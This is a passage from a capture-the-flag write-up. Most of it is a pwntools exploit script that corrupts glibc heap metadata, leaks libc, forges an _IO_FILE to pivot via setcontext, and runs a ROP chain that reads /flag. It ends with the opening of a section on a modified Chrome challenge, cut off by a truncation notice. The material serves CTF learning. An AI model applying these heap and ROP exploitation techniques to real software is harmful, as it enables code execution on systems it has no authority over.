  malloc(0x80)

  edit(0x108,p64(0x17e1))
  edit(0x18e8,p64(0x21))
  edit(0x1908,p64(0x21))
  free(0x110) # modify stdout to mmap+0x100 to leak libc
  r.recv(8)
  libc.address = u64(r.recv(8).ljust(8,"\x00")) - 0x39e683
  print("libc = {}".format(hex(libc.address)))

  IO_str_table = libc.address + 0x0039A090
  IO_str_table = IO_str_table - 0x10
  __morecore_8 = libc.address + 0x39e388 - 0xa0
  print("__morecore-8 = {}".format(hex(__morecore_8))) # bypass setcontext , push rcx ; ret
  setcontext = 0x43565 + libc.address
  print("setcontext = {}".format(hex(setcontext)))
  _IO_FILE = ( p64(0) +
               p64(0xdadaddaaddddaaaa)*3 +
               p64(0) +                     # + 0x20
               p64(0x7fffffffffffffff) +
               p64(0xdadaddaaddddaaaa) +
               p64(0) +                     # + 0x38
               p64((__morecore_8 - 100) / 2) + #  rdi
               p64(0xdadaddaaddddaaaa)*11 +
               p64(libc.address+0x39e508) + # + 0xa8
               p64(0xdadaddaaddddaaaa)*6 +
               p64(IO_str_table) +          # + 0xd8
               p64(setcontext))

  edit(0x3418,p64(0x21))
  edit(0x2008,p64(0x1411))
  free(0x2010)  # modify _IO_list_all to mmap+0x2000
  edit(0x2000,_IO_FILE)
  edit(0x3008,p64(0x1121)) # modify __morecore-8 to mmap+0x3000
  edit(0x4128,p64(0x21))
  free(0x3010)
  pop_rax = libc.address + 0x0000000000036d98
  pop_rdi = libc.address + 0x000000000001feea
  pop_rsi = libc.address + 0x000000000001fe95
  pop_rdx = libc.address + 0x0000000000001b92
  syscall = libc.address + 0x00000000000aa6b5
  buf = libc.address + 0x39d000

  rop = (p64(pop_rax) + p64(0) + # read "/flag" ; open read write
         p64(pop_rdi) + p64(0) +
         p64(pop_rsi) + p64(buf) +
         p64(pop_rdx) + p64(0x100) +
         p64(syscall) +
         p64(pop_rax) + p64(2) +
         p64(pop_rdi) + p64(buf) +
         p64(pop_rsi) + p64(0) +
         p64(pop_rdx) + p64(0) +
         p64(syscall) +
         p64(pop_rax) + p64(0) +
         p64(pop_rdi) + p64(3) +
         p64(pop_rsi) + p64(buf) +
         p64(pop_rdx) + p64(100) +
         p64(syscall) +
         p64(pop_rax) + p64(1) +
         p64(pop_rdi) + p64(1) +
         p64(pop_rsi) + p64(buf) +
         p64(pop_rdx) + p64(100) +
         p64(syscall))

  edit(0x3000,rop)
  r.sendline("A") # trigger on exit()
  time.sleep(0.1)
  r.send("/flag\x00")
  r.interactive()


```

### OOB
Given a Chrome binary and a patch file, we were asked to pwn a modified Chrome browser.
#### Vulnerability
First we checked the patch file:


```diff
..................
```

---

*Truncated at 1200 lines. Full text: <https://github.com/balsn/ctf_writeup/blob/f9d99dc0f446376cb8a4882d09d80a37c8fa79cf/20190427-%2Actf/README.md>*
